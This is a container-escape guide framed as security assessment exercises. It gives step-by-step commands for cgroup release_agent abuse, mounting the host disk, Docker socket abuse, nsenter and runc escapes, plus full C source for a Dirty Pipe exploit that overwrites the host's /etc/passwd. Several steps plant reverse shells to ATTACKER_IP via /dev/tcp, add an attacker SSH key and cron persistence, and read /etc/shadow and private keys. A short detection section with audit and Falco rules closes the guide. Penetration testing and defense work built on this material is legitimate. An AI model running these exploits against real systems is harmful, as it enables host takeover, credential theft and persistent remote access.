# Container Escape Techniques Guide

## Introduction

Container escape techniques involve breaking out of a containerized environment to access the host system or other containers. This is one of the most critical skills in container security assessment, as a successful escape from a container to its host provides the attacker with root-level access to the underlying machine, and potentially lateral movement across the entire cluster.

Container isolation relies on Linux kernel features: namespaces (PID, mount, network, UTS, IPC, user, cgroup), cgroups (resource limits), capabilities (fine-grained privilege control), seccomp (syscall filtering), and mandatory access control (AppArmor, SELinux). An escape occurs when one or more of these isolation boundaries can be circumvented.

This guide covers practical methods for testing container isolation boundaries through progressive exercises, from initial reconnaissance to full host compromise. Each technique includes the prerequisites required, the exploitation steps, and the defensive mitigations.

### Escape Technique Taxonomy

| Category | Technique | Required Condition | Impact |
|----------|-----------|-------------------|--------|
| Privileged abuse | cgroup release_agent | CAP_SYS_ADMIN or privileged | Host code execution |
| Privileged abuse | Docker socket mount | docker.sock mounted | Full host control |
| Privileged abuse | Host filesystem mount | / mounted or device access | Host file read/write |
| Kernel exploit | Dirty Pipe (CVE-2022-0847) | Kernel 5.8-5.16.11 | File overwrite on host |
| Kernel exploit | CVE-2024-1086 (netfilter) | Unprivileged user namespace | Full root on host |
| Kernel exploit | CVE-2022-0185 (cgroup) | CAP_SYS_ADMIN | Container escape |
| Namespace | PID namespace sharing | hostPID enabled | Process injection |
| Namespace | nsenter abuse | hostPID + appropriate caps | Full namespace escape |
| Runtime | runc exploit (CVE-2019-5736) | Docker < 18.09.2 | Host binary overwrite |
| Kubernetes | Privileged pod creation | RBAC permission to create pods | Node compromise |
| Kubernetes | HostPath mount via pod spec | RBAC permission to create pods | Host filesystem access |

## Hands-on Exercises

### Exercise 1: Detecting Escape Opportunities

First, determine what privileges and capabilities the container has.

```bash
# Check if running in a container
cat /proc/1/cgroup 2>/dev/null | grep -qE "(docker|kubepods|containerd)" && \
  echo "CONTAINER DETECTED"

# Check for privileged mode
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff = fully privileged (all capabilities)

# List capabilities
apt install -y libcap2-bin 2>/dev/null; capsh --print

# Check for dangerous capabilities
grep Cap /proc/self/status
# Decode: capsh --decode=0000003fffffffff

# Key dangerous capabilities:
# CAP_SYS_ADMIN  - mount, namespace manipulation
# CAP_SYS_PTRACE - process injection
# CAP_NET_ADMIN  - network manipulation
# CAP_DAC_OVERRIDE - bypass file permissions
# CAP_SYS_MODULE - load kernel modules

# Check mounted filesystems and devices
mount | grep -E "(cgroup|proc|sys|dev)"
ls /dev/ | grep -E "(sda|vda|nvme|dm-)"
fdisk -l 2>/dev/null
```

### Exercise 2: Privileged Container Escape via cgroups

```bash
# Classic escape: abuse cgroup release_agent (CVE-2022-0492 variant)
# Requires: privileged container OR CAP_SYS_ADMIN

# Step 1: Create a cgroup with release_agent
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/escape

# Step 2: Enable notifications
echo 1 > /tmp/cgrp/escape/notify_on_release

# Step 3: Find host path for container filesystem
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

# Step 4: Set release_agent to execute our payload on host
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# Step 5: Create payload (reverse shell to attacker)
cat > /cmd << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
chmod +x /cmd

# Step 6: Trigger by creating and removing a process in the cgroup
sh -c "echo \$\$ > /tmp/cgrp/escape/cgroup.procs"
# The release_agent executes on the HOST when the cgroup becomes empty
```

### Exercise 3: Escape via Host Filesystem Mount

```bash
# If /dev/sda (or host disk) is accessible
# Requires: privileged mode or CAP_SYS_ADMIN + device access

# Mount host root filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# Access host files
cat /mnt/host/etc/shadow
cat /mnt/host/root/.ssh/id_rsa

# Plant persistence on host
echo '* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' \
  >> /mnt/host/etc/crontab

# Or add SSH key
mkdir -p /mnt/host/root/.ssh
echo "ssh-rsa AAAA...attacker_key..." >> /mnt/host/root/.ssh/authorized_keys

# Escape via chroot
chroot /mnt/host /bin/bash
# Now running as root on the host filesystem
```

## 4. Docker Socket Escape

```bash
# If Docker socket is mounted inside the container
# Common in CI/CD containers: -v /var/run/docker.sock:/var/run/docker.sock

# Verify socket access
ls -la /var/run/docker.sock

# Use docker CLI (install if needed) or curl
# Create a privileged container that mounts host root
curl -s --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/containers/create" \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["/bin/sh", "-c", "cat /host/etc/shadow > /output/shadow"],
    "Binds": ["/:/host", "/tmp:/output"],
    "Privileged": true
  }' | jq -r '.Id'

# Start the container (replace CONTAINER_ID)
curl -s --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/containers/CONTAINER_ID/start"

# Or spawn interactive shell on host
docker run -it --privileged --pid=host --net=host \
  -v /:/mnt/host alpine chroot /mnt/host /bin/bash
```

## 5. Kernel Exploit Escape (Dirty Pipe Example)

```bash
# CVE-2022-0847 (Dirty Pipe) - Linux kernel 5.8 to 5.16.11
# Allows overwriting read-only files, including host files from container

# Check kernel version
uname -r
# Vulnerable: 5.8 <= version < 5.16.11

# Compile exploit
cat > dirtypipe.c << 'EOF'
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#ifndef PIPE_BUF_FLAG_CAN_MERGE
#define PIPE_BUF_FLAG_CAN_MERGE 0x10
#endif

static void prepare_pipe(int p[2]) {
    if (pipe(p)) abort();
    const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    static char buffer[4096];
    unsigned r;
    for (r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        write(p[1], buffer, n);
        r -= n;
    }
    for (r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        read(p[0], buffer, n);
        r -= n;
    }
}

int main(int argc, char **argv) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s target_file offset data\n", argv[0]);
        return 1;
    }
    const char *path = argv[1];
    loff_t offset = strtoul(argv[2], NULL, 0);
    const char *data = argv[3];
    const size_t data_size = strlen(data);

    int fd = open(path, O_RDONLY);
    if (fd < 0) { perror("open"); return 1; }

    int p[2];
    prepare_pipe(p);

    --offset;
    ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
    if (nbytes < 0) { perror("splice"); return 1; }

    nbytes = write(p[1], data, data_size);
    if (nbytes < 0) { perror("write"); return 1; }

    printf("Overwrote %zd bytes at offset %lu\n", nbytes, offset + 1);
    return 0;
}
EOF

gcc -o dirtypipe dirtypipe.c
# Overwrite /etc/passwd on host (via /proc/1/root if accessible)
./dirtypipe /proc/1/root/etc/passwd 4 ":aaaa:0:0::/root:/bin/bash"
```

## 6. Process Namespace Escape (CAP_SYS_PTRACE)

```python
#!/usr/bin/env python3
# Escape via process injection into host PID namespace
# Requires: CAP_SYS_PTRACE + hostPID (--pid=host)

import ctypes
import os

# Find a host process to inject into
# PID 1 on host is visible if --pid=host
target_pid = 1

# Read target process memory maps
with open(f'/proc/{target_pid}/maps', 'r') as f:
    for line in f:
        if 'r-xp' in line and 'libc' in line:
            base_addr = int(line.split('-')[0], 16)
            print(f'libc base: 0x{base_addr:x}')
            break

# Use nsenter to enter host namespaces
os.system(f'nsenter -t 1 -m -u -i -n -p -- /bin/bash -c '
          f'"id; cat /etc/hostname"')
```

```bash
# Simpler nsenter-based escape (requires --pid=host)
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
# Now running in host namespaces with full access
```

## 7. RunC Escape (CVE-2019-5736)

```bash
# CVE-2019-5736: Overwrite host runc binary via /proc/self/exe
# Affects runc < 1.0-rc6, Docker < 18.09.2

# Check runc version
docker --version
# Or from inside container:
cat /proc/self/exe | strings | grep -i "runc\|version"

# The exploit overwrites the host runc binary when docker exec is used
# Payload: when admin runs 'docker exec', host runc gets replaced
cat > /bin/sh << 'PAYLOAD'
#!/proc/self/exe
# This triggers the vulnerability - /proc/self/exe points to host runc
PAYLOAD

# Full exploit requires careful race condition handling
# Use pre-built exploit:
git clone https://github.com/Frichetten/CVE-2019-5736-PoC.git
cd CVE-2019-5736-PoC
# Edit payload in main.go
go build -o exploit main.go
./exploit
# Wait for admin to run: docker exec -it container_name /bin/sh
```

## 8. Detection and Prevention

```bash
# Detect container escape attempts (defender perspective)

# Monitor for suspicious mount operations
auditctl -w /proc/1/root -p r -k container_escape
auditctl -a always,exit -F arch=b64 -S mount -k container_mount

# Check for containers running as privileged
docker ps -q | xargs docker inspect --format \
  '{{.Name}}: Privileged={{.HostConfig.Privileged}} Caps={{.HostConfig.CapAdd}}'

# Falco rules for escape detection
cat > /etc/falco/rules.d/escape_detection.yaml << 'EOF'
- rule: Container Escape via Mount
  desc: Detect mounting of host filesystem inside container
  condition: >
    evt.type = mount and container and
    (evt.arg.dev contains "/dev/sd" or evt.arg.dev contains "/dev/vd")
  output: >
    Container escape attempt via mount
    (user=%user.name container=%container.name dev=%evt.arg.dev)
  priority: CRITICAL

- rule: Container Escape via Docker Socket
  desc: Detect access to Docker socket from container
  condition: >
    container and fd.name = /var/run/docker.sock and evt.type in (connect, open)
  output: >
    Docker socket access from container
    (user=%user.name container=%container.name command=%proc.cmdline)
  priority: CRITICAL
EOF
```
